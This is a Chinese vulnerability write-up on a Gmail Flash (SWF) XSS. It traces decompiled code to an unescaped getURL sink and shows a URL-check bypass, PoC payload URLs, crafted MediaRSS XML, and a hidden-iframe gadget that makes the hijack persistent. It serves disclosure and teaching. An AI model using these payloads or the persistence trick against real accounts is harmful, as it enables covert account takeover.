# 一次SWF XSS挖掘和利用

[ 目录 ]

[0x00] 背景

[0x01] 挖掘漏洞

[0x02] 优雅利用

[0x03] 从反射到rootkit

[0x04] 总结

[0x00] 背景

这篇迟到了近一年的paper是对[WooYun: Gmail某处XSS可导致账号持久劫持](http://www.wooyun.org/bugs/wooyun-2012-04841)漏洞的详细说明,赶在世界末日发布,希望不会太晚.:)

既然标题已经提到了SWF XSS,那么第一件事就是查找mail.google.com域下的所有swf文件.感谢万能的Google,利用下面的dork,可以搜索任意域的swf, "site:yourdomain.com filetype:swf",进行简单的去重之后,我们得到了如下几个swf文件:

```
https://mail.google.com/mail/im/chatsound.swf
https://mail.google.com/mail/uploader/uploaderapi2.swf
https://mail.google.com/mail/html/audio.swf
https://mail.google.com/mail/im/sound.swf
https://mail.google.com/mail/im/media-api.swf

```

通过文件名以及直接打开,对这些的swf的功能应该有了一个初步的判断. chatsound.swf和sound.swf应该是播放声音用的, uploaderapi2.swf是上传文件, audio.swf是播放音频文件, media-api.swf? 还是不知道干嘛用的... 然后直接在Google里搜索这些swf的地址, 可以得到一些含有swf的地址, 比如"https://mail.google.com/mail/html/audio.swf?audioUrl= Example MP3 file", 通过这些swf后面跟的参数, 我们可以进一步推测出这个swf的功能, 此外在反编译时搜索这些参数, 可以快速地定位到整个swf的初始化的过程. 通过以上的过程, 我们发现, 该swf不仅仅接受audioUrl参数, 还接受videoUrl参数, 说明它还是一个视频播放器, 功能上的复杂化必然会对应用的安全性有所影响, 我们决定对此SWF文件进行深入分析.

[0x01] 挖掘漏洞

下载反编译后得到该swf所有的as文件, 通过搜索'ExternalInterface.call', 'getURL', 'navigateToURL', 'javascript:'等关键函数和字符串, 可以快速地定位一些能够执行javascript的代码段. 当搜索'javascript:'时, 我们得到了如下有意思的代码:

```
==com.google.video.apps.VideoPlayback==
    _loc1.onPlaybackComplete = function ()
    {
        if (this.playerMode_ == com.google.ui.media.MediaPlayer.PLAYER_MODE_NORMAL || this.playerMode_ == com.google.ui.media.MediaPlayer.PLAYER_MODE_MINI)
        {
            this.queueURL("javascript:FlashRequest(\'donePlaying\', \'\"" + this.mediaPlayer_.url + "\"\');");
        } // end if
        ...

```

一个类似javascript伪协议的字符串被代入了queueURL函数, 而且最为关键的是this.mediaPlayer_.url是被直接拼接到字符串的, 并未加以对引号的转义. 但说这是一个xss漏洞还为时过早, 因为我们不知道queueURL函数到底是做什么的, 而且对于this.mediaPlayer_.url在赋值之前是否有进行过滤, 还是处于一个未知的状态. 此外通过对函数名的判断,onPlaybackComplete应该是一个在播放完毕之后的回调函数.

我们搜索到了函数queueURL被定义的地方, 代码如下:

```
==com.google.video.apps.VideoPlayback==
    _loc1.queueURL = function (url)
    {
        if (this.urlQueue_ == undefined)
        {
            this.urlQueue_ = new Array();
        } // end if
        this.urlQueue_.push(url);
    };
    ...

```

然后通过跟踪"urlQueue_"变量, 发现如下代码:

```
==com.google.video.apps.VideoPlayback==
    _loc1.checkForPageChanges = function ()
    {
        ...
        if (this.urlQueue_ != undefined)
        {
            var _loc2 = this.urlQueue_.shift();
            if (_loc2 != undefined)
            {
                getURL(_loc2, "_self");
            } // end if
        }
        ...

```

继续跟踪"checkForPageChanges"函数:

```
==com.google.video.apps.VideoPlayback==
    _loc1.initPlayerWithVars = function ()
    {
        ...
        _global.setInterval(this, "checkForPageChanges", 100);
        ...

```

搜索"initPlayerWithVars"函数:

```
==com.google.video.apps.VideoPlayback==
    _loc1.initializePlayer = function ()
    {
        ...
        if (this.mediaState_ != undefined && (this.mediaState_.videoUrl != undefined || this.mediaState_.audioUrl != undefined))
        {
            this.initPlayerWithVars();
        } // end if

```

从函数名字initializePlayer推断, 这个应该是一个初始化播放器的函数, 在swf打开的时候应该会被执行. 通过搜索的结果, 对整个过程进行反演:initializePlayer函数初始化播放器, 通过对(this.mediaState_ != undefined && (this.mediaState_.videoUrl != undefined || this.mediaState_.audioUrl != undefined))这一逻辑的判读, 如果为true, 则执行initPlayerWithVars函数, 每隔100毫秒调用checkForPageChanges函数, checkForPageChanges函数会检查urlQueue_是否为空数组, 如果不为空, 则弹出数组成员, 直接传入getURL函数. 而onPlaybackComplete则是一回调函数, 当播放完成后自动调用, 如果满足逻辑(this.playerMode_ == com.google.ui.media.MediaPlayer.PLAYER_MODE_NORMAL || this.playerMode_ == com.google.ui.media.MediaPlayer.PLAYER_MODE_MINI), 会把this.mediaPlayer_.url参数压入urlQueue_数组.

通过以上跟踪分析, 我想我们可以得到第一个疑问的答案了,this.mediaPlayer_.url参数最终会被传入到getURL函数. 现在要来看mediaPlayer_.url参数是怎么取到的.

搜索mediaPlayer_.url:

```
==com.google.video.apps.VideoPlayback==
    _loc1.initPlayerWithVars = function ()
    {
        this.videoStats_.endPlayback();
        if (this.mediaState_.videoUrl != undefined)
        {
            this.mediaPlayer_.mediaType = com.google.ui.media.MediaPlayer.MEDIA_VIDEO;
            this.setVideoUrl(this.mediaState_.videoUrl);
        }
        else if (this.mediaState_.audioUrl != undefined)
        {
            this.mediaPlayer_.mediaType = com.google.ui.media.MediaPlayer.MEDIA_AUDIO;
            this.mediaPlayer_.url = this.mediaState_.audioUrl;

            ...

    _loc1.setVideoUrl = function (url)
    {
        this.mediaPlayer_.url = url;
        ...
    };

```

通过上述代码可以发现mediaPlayer_.url可以从两个地方获取, mediaState_.videoUrl和mediaState_.audioUrl. 现在再回过头来看文章开头的地方提到两个参数, videoUrl和audioUrl, 我们推断mediaState_.videoUrl和mediaState_.audioUrl参数是从url中传入的. 为了验证这一的想法, 我把audio.swf放置在本地服务器上, 并自己写了一个swf去读取audio.swf中的mediaState_.videoUrl和mediaState_.audioUrl. 当我载入http://localhost/gmail/audio.swf?videoUrl=http://localhost/test.flv时, 发现读取到的mediaState_.videoUrl为空.看来事情并没有我们想象的那么简单.

我们继续来跟代码. mediaState_应该是一个类的实例, 通过实例的名字, 我们猜测类名可能是mediaState, 搜索mediaState, 果然存在这个类:com.google.video.apps.MediaState. 阅读代码, 我们发现了读取mediaState_.videoUrl值失败的关键逻辑

```
==com.google.video.apps.MediaState==
    _loc1.fromArgs = function (mainClip, playPageBase)
    {
        ...
        if (mainClip.videoUrl == undefined && mainClip.videourl != undefined)
        {
            mainClip.videoUrl = mainClip.videourl;
        } // end if
        ...
        if (com.google.webutil.url.Utils.isValidVideoUrl(mainClip.videoUrl))
        {
            this.videoUrl = mainClip.videoUrl;
        }
        if (com.google.webutil.url.Utils.isValidAbsoluteGoogleUrl(mainClip.audioUrl))
        {
            this.audioUrl = mainClip.audioUrl;
        }

```

看来swf对从url传入的值进行了检查. 我们接着跟踪com.google.webutil.url.Utils.isValidVideoUrl和com.google.webutil.url.Utils.isValidAbsoluteGoogleUrl这两个函数.

```
==com.google.webutil.url.Utils==
    _loc1.isValidVideoUrl = function (videoUrl)
    {
        if (com.google.webutil.url.Utils.isPrefix(videoUrl, "http://youtube.com/watch?v="))
        {
            return (true);
        } // end if
        var _loc3 = "http://vp";
        if (!com.google.webutil.url.Utils.isPrefix(videoUrl, _loc3))
        {
            return (false);
        } // end if
        var _loc4 = videoUrl.indexOf(".", _loc3.length);
        if (_loc4 != _loc3.length && _global.isNaN(_global.parseInt(videoUrl.slice(_loc3.length, _loc4))))
        {
            return (false);
        } // end if
        return (com.google.webutil.url.Utils.isPrefix(videoUrl.substr(_loc4), ".video.google.com/videodownload"));
    };

    _loc1.isValidAbsoluteGoogleUrl = function (url)
    {
        if (com.google.webutil.url.Utils.isValidAbsoluteUrl(url))
        {
            var _loc3 = "google.com";
            var _loc4 = com.google.webutil.url.Utils.getProtocolAndHost(url);
            var _loc5 = _loc4.substring(_loc4.length - _loc3.length);
            return (_loc5 == _loc3);
        } // end if
        return (false);
    };

```

现在回想一下我们利用成功的前提条件, 就是需要函数没有在对mediaState_.videoUrl或mediaState_.audioUrl赋值时进行引号的转义. 阅读以上的代码, 我们发现验证函数并没有任何对引号进行转义操作, 说明这个漏洞的确是存在的.:) 但是别高兴地太早了, 在回过头想一下触发getURL的函数onPlaybackComplete, 没错, 是一个回调函数, 需要视频流或者音频流播放完毕, 因此, 我们必须要寻找一个确实存在的视频或者音频文件, 且能满足以上对于url的检查. 由于audio.swf文件创建时间比较早, isValidVideoUrl函数中检验的几个api均已经废弃了, 因此我们转向检查较为宽松的isValidAbsoluteGoogleUrl的函数以寻求突破.

我们来看下com.google.webutil.url.Utils.getProtocolAndHost这个关键函数.

```
==com.google.webutil.url.Utils==
    _loc1.getProtocolAndHost = function (url)
        {
            var _loc3 = com.google.webutil.url.Utils.getProtocolHostAndPort(url);
            var _loc4 = _loc3.indexOf("://");
            var _loc5 = _loc3.lastIndexOf(":");
            if (_loc5 < 0 || _loc4 == _loc5)
            {
                return (_loc3);
            }
            else
            {
                return (_loc3.substring(0, _loc5));
            } // end else if
        };
    ...
    _loc1.getProtocolHostAndPort = function (url)
    {
        var _loc3 = url.indexOf("://");
        if (_loc3 == -1)
        {
            _loc3 = 0;
        }
        else
        {
            _loc3 = _loc3 + 3;
        } // end else if
        var _loc4 = com.google.webutil.url.Utils.indexOfOrMax(url, "/", _loc3);
        var _loc5 = com.google.webutil.url.Utils.indexOfOrMax(url, "?", _loc3);
        var _loc6 = Math.min(_loc4, _loc5);
        return (url.substring(0, _loc6));
    };

```

注意getProtocolAndHost函数中var_loc5 = _loc3.lastIndexOf(":")这行代码, 我想程序员的本意是想利用这个":"获取web应用的端口, 如localhost:8080之类的, 但是在uri中,还有一个地方是需要":"的, 就是在401登陆中, 作为用户名和密码的分割符, 而且这个":"出现的位置是在作为分割host和端口的":"之前. 利用这个特性,我们就可以很轻松地绕过isValidAbsoluteGoogleUrl的检查了. 载入http://localhost/gmail/audio.swf?audioUrl=http://google.com:@localhost/t.mp3时, 成功地读取到的mediaState_.audioUrl的值,就是http://google.com:@localhost/t.mp3.

再加上其他参数,使得能满足上述的一些if判断,最后的poc如下:

```
https://mail.google.com/mail/html/audio.swf?playerMode=normal&autoplay=true&audioUrl=http://google.com:@localhost/gmail/t.mp3?%27%29%3Bfunction%20FlashRequest%28%29%7Balert%28document.domain%29%7D%2f%2f

```

URL解码后如下

```
https://mail.google.com/mail/html/audio.swf?playerMode=normal&autoplay=true&audioUrl=http://google.com:@localhost/gmail/t.mp3?');function FlashRequest(){alert(document.domain)}//

```

我们拼接最后传入getURL的伪协议字符串

```
javascript:FlashRequest('donePlaying', 'http://google.com:@localhost/gmail/t.mp3?');function FlashRequest(){alert(document.domain)}//');

```

由于在承载swf的html页面中FlashRequest未定义, 我们需要自己定义一个FlashRequest函数, 而且在js中, function语句是最先执行的, 所以不用担心在执行FlashRequest('donePlaying', 'http://google.com:@localhost/gmail/t.mp3?')这句时FlashRequest还没有定义. 当然, 你可以把alert(document.domain)转换成任意你想要执行的js代码. 另外值得注意的一点就是, 由于getURL操作在mp3播放完毕后才触发的, 因此我们把http://localhost/t.mp3剪切得足够短, 只有0.5秒, 当你打开swf之后, 不到一秒钟, MP3已经载入并播放完毕, js得到了执行, 你很难察觉到其中的延迟.

[0x02] 优雅利用

对于一个完美主义者, 我们不得不承认, 上述提到的poc是丑陋的. 原因如下:

```
1. 我们的URL中含有大量的脏代码, 这仅仅是一个poc, 如果需要更进一步的操作, 我们还要添加大量字符到url.
2. 像"http://google.com:@localhost/t.mp3"这样的URL只能被Firefox认可, Chrome和IE会废弃这类的请求.
3. 如果我们需要真正地做一些dirty work, 而不仅仅是弹个document.domain的窗, 那么我们可能需要进行一些的网络通信, 比如载入js,获取关键数据等, 而这些操作的代价是什么, 没错, 就是时间. 我们的poc仅仅是播放一个0.5秒长的MP3文件, 对于一个无聊的dead page, 人们的反应通常右上角的X. 换句话说, 我们争取不到我们需要的时间.

```

那么如何形成一个更加优雅的利用方式呢?

我在查找fromArgs函数时, 发现以下的代码

```
==com.google.video.apps.VideoPlayback==
    if (com.google.webutil.url.Utils.isValidAbsoluteUrl(this.clip_.videoUrl) || com.google.webutil.url.Utils.isValidAbsoluteUrl(this.clip_.audioUrl))
    {
        this.mediaState_ = new com.google.video.apps.MediaState();
        this.mediaState_.fromArgs(this.clip_, this.vgcHostPort + com.google.video.apps.VideoPlayback.VGC_PLAYPAGE_PATH);
    }
    else if (com.google.webutil.url.Utils.isValidAbsoluteUrl(this.clip_.mediarss))
    {
        this.mediaRss_ = new com.google.xml.MediaRSS();
        this.mediaRss_.init(this.clip_.mediarss);
    }

```

我想大概有两个办法可以载入一段视频, 一个是直接赋值一个videoUrl, 正如前文提到的, 另一个就是通过制定一个mediarss, swf去解析这个rss, 播放其中指定的视频, 更美妙的是, 对于mediarss, 只判断是是否是绝对地址(isValidAbsoluteUrl), 这使得载入我们直接服务器上的mediarss文件成为了可能.

让我们忘记所有的代码吧, 对于这种xml文件类的调试, 我想以黑盒的方式更加方便一些. 再感谢万能的Google, 我从网上找到了一份mediarss的样本, 修改如下, 我们替换了中的, 改成自己服务器上的flv文件地址. 上传到http://localhost/gmail/media.xml.

```
<rss version="2.0">
        <channel>
            <title>Google Video - Google Video top100 new</title>
            <link>http://video.google.com</link>
            <description>Google Video's top new videos.</description>
            <generator>Google Video</generator>
            <image>
                <title>Google Video top100 new</title>
                <link>http://video.google.com</link>
                <url>http://video.google.com/common/google_logo_small.jpg</url>
                <width>100</width>
                <height>37</height>
            </image>
            <item>
                <title>rubia</title>
                <link>http://video.google.com/videoplay?docid=-3406925506469882756&sourceid=top100newfeed</link>
                <guid>http://video.google.com/videoplay?docid=-3406925506469882756</guid>;
                <pubDate>Sun, 21 May 2006 17:00:00 PDT</pubDate>
                <description/>
                <author>individual</author>
                <media:group>
                    <media:content url="http://localhost/gmail/1.flv" type="video/x-flv" medium="video" expression="full" duration="68" width="320" height="240"/>
                </media:group>
            </item>
        </channel>
    </rss>

```

现在打开https://mail.google.com/mail/html/audio.swf?playerMode=normal&mediarss=http://localhost/gmail/media.xml&autoplay=true 我们惊喜地发现1.flv被成功地载入了, 看来swf对于从mediarss中传入的videoUrl, 并没有类似对url中传入videoUrl值的一个有效性验证, 短板理论在这里发挥了作用:)

为了更加完美地利用, 我们继续对media.xml进行一些小小的修改.

```
<rss version="2.0">
        <channel>
            <title>Google Video - Google Video top100 new</title>
            <link>http://video.google.com</link>
            <description>Google Video's top new videos.</description>
            <generator>Google Video</generator>
            <image>
                <title>Google Video top100 new</title>
                <link>http://video.google.com</link>
                <url>http://video.google.com/common/google_logo_small.jpg</url>
                <width>100</width>
                <height>37</height>
            </image>
            <item>
                <title>rubia</title>
                <link>http://video.google.com/videoplay?docid=-3406925506469882756&sourceid=top100newfeed</link>
                <guid>http://video.google.com/videoplay?docid=-3406925506469882756</guid>;
                <pubDate>Sun, 21 May 2006 17:00:00 PDT</pubDate>
                <description/>
                <author>individual</author>
                <media:group>
                    <media:content url="http://localhost/gmail/1.flv?');function FlashRequest(){alert(document.domain)}//" type="video/x-flv" medium="video" expression="full" duration="68" width="320" height="240"/>
                </media:group>
            </item>
            <item>
                <title>rubia</title>
                <link>http://video.google.com/videoplay?docid=-3406925506469882756&sourceid=top100newfeed</link>
                <guid>http://video.google.com/videoplay?docid=-3406925506469882756</guid>;
                <pubDate>Sun, 21 May 2006 17:00:00 PDT</pubDate>
                <description/>
                <author>individual</author>
                <media:group>
                    <media:content url="http://localhost/gmail/2.flv" type="video/x-flv" medium="video" expression="full" duration="68" width="320" height="240"/>
                </media:group>
            </item>
        </channel>
    </rss>

```

其中1.flv是一段黑色背景, 无任何内容, 长0.5秒的视频, 播放1.flv结束后, 触发了事件, 通过getURL执行了js脚本, 与此同时,swf开始播放2.flv, 这是一段真正的有内容的视频, 他可以为我们争取到足够的时间进行一些dirty work了. 那么对于点开视频的人来说, 这段时间内究竟发生了什么呢, 他只是照常点了一个连接,发现是一段有意思的小视频, 可能这段视频前面有0.5秒的停滞,但又有谁会注意到呢?

[0x03] 从反射到rootkit

现在我们有一个利用十分优雅的xss了, 哦, 对不起, 但是这只是一个反射型xss, 用处似乎不大? 我们能不能把这个反射型xss转化成一个存储型的呢, 甚至更进一步, 变成一个rootkit, 一个xss shell, 使得用户在每一次打开gmail时都可中枪, 执行我们的js.

-什么?不可能?

-风太大,听不见. - .-

下面就看这个神奇的show吧. Gmail里面有个lab, 提供一些新奇的实验性的小玩意, 其中有一个就是"Add any gadget by URL". 你可以指定一个特定的gadget网址, 这个gadget会出现在你gmail页面的左下角. 用户可以往gadget里添加任意的html代码, 包括script, Google通过把这个gadget的域名设定为googleusercontent.com, 然后以iframe的方式载入, 来避免可能产生的安全问题. 但这个是否足够安全呢, 在大多数情况下, 是的. 可我们现在有了一个反射型xss, 这个答案就不一样了.

我根据digg.com的gadget做了一些修改, iframe了一个我们刚刚挖掘的gmail反射型xss.

```
<?xml version="1.0" encoding="UTF-8" ?><Module>
        <ModulePrefs title=" " directory_title="Digg 2.0" title_url="http://digg.com/"
            description="Discover the best news, images and videos as voted on by the Digg community, from the social news website Digg.com. You can now customize your Digg gadget by topic, and view more story information, such as comments and a friend's activity feed.  Let us know what you think at feedback.digg@digg.com"
            screenshot="http://cdn1.diggstatic.com/img/gadget/ig.a39bd77c.png"
            thumbnail="http://cdn3.diggstatic.com/img/gadget/ig-thumb.0281a8d3.png"
            author="Digg.com Inc." author_location="San Francisco, CA"
            author_email="feedback.digg@digg.com" author_affiliation="digg.com Inc."
            category="news" category2="technology">
            <Require feature="dynamic-height" />
            <Require feature="tabs" />
            <Require feature="setprefs" />
        </ModulePrefs>

        <UserPref name="user" datatype="hidden" />
        <UserPref name="thumbnail" datatype="hidden" default_value="1" />
        <UserPref name="filter" datatype="hidden" default_value="0" />
        <UserPref name="num" datatype="hidden" default_value="5" />
        <UserPref name="type" datatype="hidden" default_value="popular" />
        <UserPref name="refresh" datatype="hidden" default_value="0" />
        <UserPref name="tab" datatype="hidden" default_value="0" />
        <UserPref name="offset" datatype="hidden" default_value="0" />
        <UserPref name="pagination" datatype="hidden" default_value="0" />
        <UserPref name="business" datatype="hidden" default_value="true" />
        <UserPref name="entertainment" datatype="hidden" default_value="true" />
        <UserPref name="gaming" datatype="hidden" default_value="true" />
        <UserPref name="lifestyle" datatype="hidden" default_value="true" />
        <UserPref name="offbeat" datatype="hidden" default_value="true" />
        <UserPref name="politics" datatype="hidden" default_value="true" />
        <UserPref name="science" datatype="hidden" default_value="true" />
        <UserPref name="sports" datatype="hidden" default_value="true" />
        <UserPref name="technology" datatype="hidden" default_value="true" />
        <UserPref name="world_news" datatype="hidden" default_value="true" />


        <Content type="html">
        <![CDATA[
        <iframe width='0'style='visibility:hidden;' height='0' src="https://mail.google.com/mail/html/audio.swf?playerMode=normal&mediarss=http://localhost/gmail/2.xml&autoplay=true"></iframe>
        ]]>

        </Content>
    </Module>

```

整个攻击流程如下:

```
[1] 黑客诱使受害者点击一个连接.Hacker sends a mail to the victim with a link.
[2] 用户点击连接后,访问了我们的反射型xss,精心构造的js被执行.Victim receives the mail and unfortunately, clicks the link whick lead to our reflected xss swf metion above.
[3] JS脚本探测用户是否开启了"Add any gadget by URL"功能,如果没有,用Ajax方式异步开启.
[4] 添加一个gadget,gadget地址为我们服务器上的一个xml文件
[5] 每当用户登录Gmail,左下角会载入gadget,gadget会iframe一个mail.google.com域的xss.通过引用top窗口句柄,黑客可以控制用户gmail中的任意内容.

```

整个过程视频如下[http://v.youku.com/v_show/id_XMzU3MjQ1NTQw.html](http://v.youku.com/v_show/id_XMzU3MjQ1NTQw.html).

[0x04] 总结

挖掘swf的漏洞并没有很难, 因为引起xss的函数最终也就这么几个, 你可以先搜索这几个关键函数, 再逆向跟踪引用它的函数, 譬如本文, 或者也可以先跟踪所有被传入swf的变量, 在跟踪这些变量的时候查看是否存在有漏洞的输出. 相比于审核JS文件中的dom输出, swf里的审核里显得方便了许多, 而且google的swf并没有类似google的js的混淆压缩, 代码更加友好. 但从调试工具上来说, swf就比JS薄弱了许多, 因此对于审核swf文件来说, 足够的耐心就显得比较重要了, 本文在第一步挖掘中跟踪了五级函数, 但实际上并没有描述那么简单, 因为每个函数基本上都会有几十次的调用, 你需要耐心地去分析每一次的调用, 找出所有可能存在漏洞的地方, 然后一级一级的向上跟踪.

而对于xss的利用, 你只需要发挥你的想象力.